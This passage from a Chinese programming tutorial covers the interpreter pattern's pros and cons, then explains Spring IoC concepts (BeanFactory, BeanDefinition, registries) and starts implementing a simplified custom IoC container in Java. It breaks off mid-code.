<li><p>易于改变和扩展文法。</p>
<p>由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>实现文法较为容易。</p>
<p>在==抽象语法树中每一个表达式节点类的实现方式都是相似的==，这些类的代码编写都不会特别复杂。</p>
</li>
</ul>
<ul>
<li><p>增加新的解释表达式较为方便。</p>
<p>如果用户需要增加新的解释表达式只需要对应增加一个新的终结符表达式或非终结符表达式类，原有表达式类代码无须修改，符合 “开闭原则”。</p>
</li>
</ul>
<ul>
<li><p><strong>缺点：</strong></p>
<ul>
<li><p>对于复杂文法难以维护。</p>
<p>在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，==类的个数将会急剧增加，导致系统难以管理和维护==。</p>
</li>
</ul>
<ul>
<li><p><strong>执行效率较低</strong>。</p>
<p>由于在解释器模式中==使用了大量的循环和递归调用==，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。</p>
</li>
</ul>
</li>
</ul>
<h5 id="使用场景-7"><a href="#使用场景-7" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li><p>==当语言的文法较为简单，且执行效率不是关键问题时==。</p>
</li>
<li><p>当问题重复出现，且可以用一种简单的语言来进行表达时。</p>
</li>
<li><p>当一个语言需要解释执行，并且语言中的句子可以表示为一个抽象语法树的时候。</p>
</li>
</ul>
<h2 id="自定义Spring框架"><a href="#自定义Spring框架" class="headerlink" title="自定义Spring框架"></a>自定义Spring框架</h2><h3 id="spring使用回顾"><a href="#spring使用回顾" class="headerlink" title="spring使用回顾"></a>spring使用回顾</h3><p>自定义spring框架前，先回顾一下spring框架的使用，从而分析spring的核心，并对核心功能进行模拟。</p>
<ul>
<li><p>数据访问层。定义UserDao接口及其子实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoImpl</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userDaoImpl ....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>业务逻辑层。定义UserService接口及其子实现类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserDao userDao;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserDao</span><span class="params">(UserDao userDao)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userDao = userDao;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;userServiceImpl ...&quot;</span>);</span><br><span class="line">        userDao.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>定义UserController类，使用main方法模拟controller层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建spring容器对象</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//从IOC容器中获取UserService对象</span></span><br><span class="line">        UserService userService = applicationContext.getBean(<span class="string">&quot;userService&quot;</span>, UserService.class);</span><br><span class="line">        <span class="comment">//调用UserService对象的add方法</span></span><br><span class="line">        userService.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>编写配置文件。在类路径下编写一个名为ApplicationContext.xml的配置文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;beans xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">       xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="line">       xmlns:context=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span><br><span class="line">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="line"><span class="string">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span><br><span class="line"><span class="string">        http://www.springframework.org/schema/context</span></span><br><span class="line"><span class="string">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=<span class="string">&quot;userService&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;com.itheima.service.impl.UserServiceImpl&quot;</span>&gt;</span><br><span class="line">        &lt;property name=&quot;userDao&quot; ref=&quot;userDao&quot;&gt;&lt;/property&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id=&quot;userDao&quot; class=&quot;com.itheima.dao.impl.UserDaoImpl&quot;&gt;&lt;/bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure>

<p>代码运行结果如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-51-11.png" style="zoom:60%;" /></li>
</ul>
<p>通过上面代码及结果可以看出：</p>
<ul>
<li>userService对象是从applicationContext容器对象获取到的，也就是userService对象交由spring进行管理。</li>
<li>上面结果可以看到调用了UserDao对象中的add方法，也就是说UserDao子实现类对象也交由spring管理了。</li>
<li>UserService中的userDao变量我们并没有进行赋值，但是可以正常使用，说明spring已经将UserDao对象赋值给了userDao变量。</li>
</ul>
<p>上面三点体现了Spring框架的IOC（Inversion of Control）和DI（Dependency Injection, DI）</p>
<h3 id="spring核心功能结构"><a href="#spring核心功能结构" class="headerlink" title="spring核心功能结构"></a>spring核心功能结构</h3><p>Spring大约有20个模块，由1300多个不同的文件构成。这些模块可以分为:</p>
<p>核心容器、AOP和设备支持、数据访问与集成、Web组件、通信报文和集成测试等，下面是 Spring 框架的总体架构图：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-52-11.png" style="zoom:40%;" />



<p>核心容器由 beans、core、context 和 expression（Spring Expression Language，SpEL）4个模块组成。</p>
<ul>
<li>spring-beans和spring-core模块是Spring框架的核心模块，包含了==控制反转（Inversion of Control，IOC）==和==依赖注入（Dependency Injection，DI）==。BeanFactory使用控制反转对应用程序的配置和依赖性规范与实际的应用程序代码进行了分离。==BeanFactory属于延时加载==，也就是说在实例化容器对象后并不会自动实例化Bean，只有当Bean被使用时，BeanFactory才会对该 Bean 进行实例化与依赖关系的装配。</li>
<li>spring-context模块构架于核心模块之上，扩展了BeanFactory，为它添加了Bean生命周期控制、框架事件体系及资源加载透明化等功能。此外，该模块还提供了许多企业级支持，如邮件访问、远程访问、任务调度等，ApplicationContext 是该模块的核心接口，它的超类是 BeanFactory。与BeanFactory不同，它是==非延迟加载==。ApplicationContext实例化后会自动对所有的单实例Bean进行实例化与依赖关系的装配，使之处于待用状态。</li>
<li>spring-context-support模块是对Spring IoC容器及IoC子容器的扩展支持。</li>
<li>spring-context-indexer模块是Spring的类管理组件和Classpath扫描组件。</li>
<li>spring-expression 模块是统一表达式语言（EL）的扩展模块，可以查询、管理运行中的对象，同时也可以方便地调用对象方法，以及操作数组、集合等。它的语法类似于传统EL，但提供了额外的功能，最出色的要数函数调用和简单字符串的模板函数。EL的特性是基于Spring产品的需求而设计的，可以非常方便地同Spring IoC进行交互。</li>
</ul>
<h4 id="bean概述"><a href="#bean概述" class="headerlink" title="bean概述"></a>bean概述</h4><p>Spring 就是面向 <code>Bean</code> 的编程（==BOP,Bean Oriented Programming==），Bean 在 Spring 中处于核心地位。Bean对于Spring的意义就像Object对于OOP的意义一样，Spring中没有Bean也就没有Spring存在的意义。Spring IoC容器通过配置文件或者注解的方式来管理bean对象之间的依赖关系。</p>
<p>spring中bean用于对一个类进行封装。如下面的配置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.service.impl.UserServiceImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>为什么Bean如此重要呢？</p>
<ul>
<li>spring 将bean对象交由一个叫IOC容器进行管理。</li>
<li>bean对象之间的依赖关系在配置文件中体现，并由spring完成。</li>
</ul>
<h3 id="Spring-IOC相关接口分析"><a href="#Spring-IOC相关接口分析" class="headerlink" title="Spring IOC相关接口分析"></a>Spring IOC相关接口分析</h3><h4 id="BeanFactory解析"><a href="#BeanFactory解析" class="headerlink" title="BeanFactory解析"></a>BeanFactory解析</h4><p><strong>Spring中Bean的创建是典型的工厂模式，这一系列的Bean工厂，即IoC容器</strong>，为开发者管理对象之间的依赖关系提供了很多便利和基础服务，在Spring中有许多IoC容器的实现供用户选择，其相互关系如下图所示。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-52-57.png" style="zoom:60%;" />

<p>其中，BeanFactory作为最顶层的一个接口，定义了IoC容器的基本功能规范，BeanFactory有三个重要的子接口：ListableBeanFactory、HierarchicalBeanFactory和AutowireCapableBeanFactory。但是从类图中我们可以发现最终的默认实现类是<code>DefaultListableBeanFactory</code>，它实现了所有的接口。</p>
<p>那么为何要定义这么多层次的接口呢？</p>
<p>每个接口都有它的使用场合，主要是为了区分在Spring内部操作过程中对象的传递和转化，对对象的数据访问所做的限制。例如，</p>
<ul>
<li><code>ListableBeanFactory</code>接口表示这些Bean可列表化。</li>
<li><code>HierarchicalBeanFactory</code>表示这些Bean 是有继承关系的，也就是每个 Bean 可能有父 Bean</li>
<li><code>AutowireCapableBeanFactory </code>接口定义Bean的自动装配规则。</li>
</ul>
<p>这三个接口共同定义了Bean的集合、Bean之间的关系及Bean行为。最基本的IoC容器接口是<code>BeanFactory</code>，来看一下它的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	String FACTORY_BEAN_PREFIX = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//根据bean的名称获取IOC容器中的的bean对象</span></span><br><span class="line">	<span class="function">Object <span class="title">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line">	<span class="comment">//根据bean的名称获取IOC容器中的的bean对象，并指定获取到的bean对象的类型，这样我们使用时就不需要进行类型强转了</span></span><br><span class="line">	&lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line">	<span class="function">Object <span class="title">getBean</span><span class="params">(String name, Object... args)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line">	&lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line">	&lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(Class&lt;T&gt; requiredType, Object... args)</span> <span class="keyword">throws</span> BeansException</span>;</span><br><span class="line">	</span><br><span class="line">	&lt;T&gt; <span class="function">ObjectProvider&lt;T&gt; <span class="title">getBeanProvider</span><span class="params">(Class&lt;T&gt; requiredType)</span></span>;</span><br><span class="line">	&lt;T&gt; <span class="function">ObjectProvider&lt;T&gt; <span class="title">getBeanProvider</span><span class="params">(ResolvableType requiredType)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//判断容器中是否包含指定名称的bean对象</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">containsBean</span><span class="params">(String name)</span></span>;</span><br><span class="line">	<span class="comment">//根据bean的名称判断是否是单例</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isPrototype</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isTypeMatch</span><span class="params">(String name, ResolvableType typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isTypeMatch</span><span class="params">(String name, Class&lt;?&gt; typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	Class&lt;?&gt; getType(String name) <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line">	String[] getAliases(String name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在BeanFactory里<strong>只对IoC容器的基本行为做了定义，根本不关心你的Bean是如何定义及怎样加载的</strong>。正如我们只关心能从工厂里得到什么产品，不关心工厂是怎么生产这些产品的。</p>
<p><code>BeanFactory</code>有一个很重要的子接口，就是<code>ApplicationContext</code>接口，该接口主要来规范容器中的bean对象是==非延时加载==，即在创建容器对象的时候就对象bean进行初始化，并存储到一个容器中。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-53-07.png" style="zoom:60%;" />

<p>要知道<strong>工厂是如何产生对象的，我们需要看具体的IoC容器实现</strong>，Spring提供了许多IoC容器实现，比如：</p>
<ul>
<li><code>ClasspathXmlApplicationContext </code>: 根据类路径加载xml配置文件，并创建IOC容器对象。</li>
<li><code>FileSystemXmlApplicationContext </code>：根据系统路径加载xml配置文件，并创建IOC容器对象。</li>
<li><code>AnnotationConfigApplicationContext </code>：加载注解类配置，并创建IOC容器。</li>
</ul>
<h4 id="BeanDefinition解析"><a href="#BeanDefinition解析" class="headerlink" title="BeanDefinition解析"></a>BeanDefinition解析</h4><p>Spring IoC容器管理我们定义的各种Bean对象及其相互关系，而Bean对象在Spring实现中是以<code>BeanDefinition</code>来描述的，如下面配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">bean标签还有很多属性：</span><br><span class="line">	scope、init-method、destory-method等。</span><br></pre></td></tr></table></figure>

<p>其继承体系如下图所示。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-53-23.png" style="zoom:60%;" />



<h4 id="BeanDefinitionReader解析"><a href="#BeanDefinitionReader解析" class="headerlink" title="BeanDefinitionReader解析"></a>BeanDefinitionReader解析</h4><p>Bean的解析过程非常复杂，功能被分得很细，因为这里需要被扩展的地方很多，必须保证足够的灵活性，以应对可能的变化。Bean的解析主要就是对Spring配置文件的解析。这个解析过程主要通过BeanDefinitionReader来完成，看看Spring中BeanDefinitionReader的类结构图，如下图所示。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-53-36.png" style="zoom:60%;" />

<p>看看BeanDefinitionReader接口定义的功能来理解它具体的作用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanDefinitionReader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取BeanDefinitionRegistry注册器对象</span></span><br><span class="line">	<span class="function">BeanDefinitionRegistry <span class="title">getRegistry</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function">ResourceLoader <span class="title">getResourceLoader</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Nullable</span></span><br><span class="line">	<span class="function">ClassLoader <span class="title">getBeanClassLoader</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">BeanNameGenerator <span class="title">getBeanNameGenerator</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		下面的loadBeanDefinitions都是加载bean定义，从指定的资源中</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">loadBeanDefinitions</span><span class="params">(Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">loadBeanDefinitions</span><span class="params">(Resource... resources)</span> <span class="keyword">throws</span> BeanDefinitionStoreException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">loadBeanDefinitions</span><span class="params">(String location)</span> <span class="keyword">throws</span> BeanDefinitionStoreException</span>;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">loadBeanDefinitions</span><span class="params">(String... locations)</span> <span class="keyword">throws</span> BeanDefinitionStoreException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="BeanDefinitionRegistry解析"><a href="#BeanDefinitionRegistry解析" class="headerlink" title="BeanDefinitionRegistry解析"></a>BeanDefinitionRegistry解析</h4><p>BeanDefinitionReader用来解析bean定义，并封装BeanDefinition对象，而我们定义的配置文件中定义了很多bean标签，所以就有一个问题，解析的BeanDefinition对象存储到哪儿？答案就是<code>BeanDefinition</code>的注册中心，而该注册中心顶层接口就是<code>BeanDefinitionRegistry</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanDefinitionRegistry</span> <span class="keyword">extends</span> <span class="title">AliasRegistry</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//往注册表中注册bean</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span></span><br><span class="line"><span class="function">			<span class="keyword">throws</span> BeanDefinitionStoreException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//从注册表中删除指定名称的bean</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">removeBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取注册表中指定名称的bean</span></span><br><span class="line">	<span class="function">BeanDefinition <span class="title">getBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//判断注册表中是否已经注册了指定名称的bean</span></span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">containsBeanDefinition</span><span class="params">(String beanName)</span></span>;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//获取注册表中所有的bean的名称</span></span><br><span class="line">	String[] getBeanDefinitionNames();</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">getBeanDefinitionCount</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">boolean</span> <span class="title">isBeanNameInUse</span><span class="params">(String beanName)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继承结构图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-15-54-04.png" style="zoom:60%;" />

<p>从上面类图可以看到BeanDefinitionRegistry接口的子实现类主要有以下几个：</p>
<ul>
<li><p>DefaultListableBeanFactory</p>
<p>在该类中定义了如下代码，就是用来注册bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, BeanDefinition&gt; beanDefinitionMap = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;(<span class="number">256</span>);</span><br></pre></td></tr></table></figure></li>
<li><p>SimpleBeanDefinitionRegistry</p>
<p>在该类中定义了如下代码，就是用来注册bean</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, BeanDefinition&gt; beanDefinitionMap = <span class="keyword">new</span> ConcurrentHashMap&lt;&gt;(<span class="number">64</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h4><p><code>ClassPathXmlApplicationContext</code>对Bean配置资源的载入是从<code>refresh()</code>方法开始的。<strong>refresh（）方法是一个模板方法</strong>，规定了 IoC 容器的启动流程，有些逻辑要交给其子类实现。它对 Bean 配置资源进行载入，==<code>ClassPathXmlApplicationContext</code>通过调用其父类<code>AbstractApplicationContext</code>的<code>refresh()</code>方法启动整个IoC容器对Bean定义的载入过程。<strong>（模板方法模式）</strong>==</p>
<h3 id="自定义SpringIOC"><a href="#自定义SpringIOC" class="headerlink" title="自定义SpringIOC"></a>自定义SpringIOC</h3><p>现要对下面的配置文件进行解析，并自定义Spring框架的IOC对涉及到的对象进行管理。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.service.impl.UserServiceImpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;userDao&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userDao&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.itheima.dao.impl.UserDaoImpl&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="定义bean相关的pojo类"><a href="#定义bean相关的pojo类" class="headerlink" title="定义bean相关的pojo类"></a>定义bean相关的pojo类</h4><h5 id="PropertyValue类"><a href="#PropertyValue类" class="headerlink" title="PropertyValue类"></a>PropertyValue类</h5><p>用于封装bean的属性，体现到上面的配置文件就是封装bean标签的子标签property标签数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PropertyValue</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="keyword">private</span> String ref;</span><br><span class="line">  <span class="keyword">private</span> String value;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">PropertyValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">PropertyValue</span><span class="params">(String name, String ref,String value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.ref = ref;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getRef</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ref;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRef</span><span class="params">(String ref)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ref = ref;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="MutablePropertyValues类"><a href="#MutablePropertyValues类" class="headerlink" title="MutablePropertyValues类"></a>MutablePropertyValues类</h5><p>一个bean标签可以有多个property子标签，所以再定义一个MutablePropertyValues类，用来<strong>存储并管理多个PropertyValue对象</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MutablePropertyValues</span> <span class="keyword">implements</span> <span class="title">Iterable</span>&lt;<span class="title">PropertyValue</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义list集合对象，用来存储PropertyValue对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;PropertyValue&gt; propertyValueList;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MutablePropertyValues</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.propertyValueList = <span class="keyword">new</span> ArrayList&lt;PropertyValue&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MutablePropertyValues</span><span class="params">(List&lt;PropertyValue&gt; propertyValueList)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.propertyValueList = (propertyValueList != <span class="keyword">null</span> ? propertyValueList : <span class="keyword">new</span> ArrayList&lt;PropertyValue&gt;());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取所有的PropertyValue对象，返回以数组的形式</span></span><br><span class="line">    <span class="keyword">public</span> PropertyValue[] getPropertyValues() &#123;</span><br><span class="line">        <span class="comment">// 将集合转换为数组并返回</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.propertyValueList.toArray(<span class="keyword">new</span> PropertyValue[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据name属性值获取PropertyValue对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PropertyValue <span class="title">getPropertyValue</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 遍历集合对象</span></span><br><span 